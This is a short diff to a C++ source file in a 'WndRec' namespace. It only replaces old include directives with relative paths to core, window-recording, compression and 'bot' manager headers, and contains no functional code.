@@ -1,12 +1,21 @@
-#include "core\core.h"
-#include "core\process.h"
-#include "core\util.h"
+//#include "core\core.h"
+//#include "core\process.h"
+//#include "core\util.h"
+//#include "WndRec\video.h"
+//#include "WndRec\sender.h"
+//#include "WndRec\manager.h"
+//#include "WndRec\stream.h"
+
 #include <shlwapi.h>
 #include <shlobj.h>
-#include "WndRec\video.h"
-#include "WndRec\sender.h"
-#include "WndRec\manager.h"
-#include "WndRec\stream.h"
+#include "../../core/include/core/memory.h"
+#include "../../core/include/core/process.h"
+#include "../include/WndRec/video.h"
+#include "../../bot/include/Manager.h"
+#include "../include/WndRec/lzw.h"
+#include "../include/WndRec/stream.h"
+#include "../../core/include/core/debug.h"
+#include "../../core/include/core/util.h"
 
 namespace WndRec
 {
